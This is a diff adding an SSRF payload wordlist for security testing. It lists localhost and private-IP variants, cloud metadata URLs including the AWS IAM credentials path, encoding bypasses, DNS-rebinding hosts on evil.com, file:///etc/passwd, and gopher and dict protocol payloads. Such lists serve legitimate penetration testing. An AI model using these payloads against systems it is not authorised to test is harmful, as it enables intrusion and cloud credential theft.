@@ -1,0 +1,91 @@
+# SSRF (Server-Side Request Forgery) Payloads
+# For testing internal network access and cloud metadata endpoint exposure
+
+# ============================================================================
+# LOCALHOST & INTERNAL NETWORKS
+# ============================================================================
+
+# Basic localhost variations
+http://localhost/
+http://127.0.0.1/
+http://0.0.0.0/
+http://127.1/
+http://2130706433/
+http://0x7f.0.0.1/
+http://0177.0.0.1/
+
+# Private networks
+http://192.168.0.1/
+http://192.168.1.1/
+http://10.0.0.1/
+http://172.16.0.1/
+http://169.254.169.254/
+
+# ============================================================================
+# CLOUD METADATA ENDPOINTS (Critical)
+# ============================================================================
+
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/identity/
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/.json
+
+# ============================================================================
+# ENCODING BYPASS
+# ============================================================================
+
+# URL encoding
+http%3A%2F%2Flocalhost%2F
+http://127.0.0.1%2F
+
+# Double encoding
+http%253A%252F%252Flocalhost%252F
+
+# ============================================================================
+# DNS REBINDING
+# ============================================================================
+
+http://localhost.evil.com/
+http://127.0.0.1.evil.com/
+http://169.254.169.254.evil.com/
+
+# ============================================================================
+# PROTOCOL BYPASS
+# ============================================================================
+
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+dict://127.0.0.1:11211/
+gopher://127.0.0.1:80/_GET
+ftp://127.0.0.1:21/
+
+# ============================================================================
+# IPV6
+# ============================================================================
+
+http://[::]/
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+
+# ============================================================================
+# INTERNAL PORTS
+# ============================================================================
+
+http://localhost:22/    # SSH
+http://localhost:3306/  # MySQL
+http://localhost:5432/  # PostgreSQL
+http://localhost:6379/  # Redis
+http://localhost:27017/ # MongoDB
+http://localhost:9200/  # Elasticsearch
+http://localhost:8500/  # Consul
+http://localhost:9090/  # Prometheus
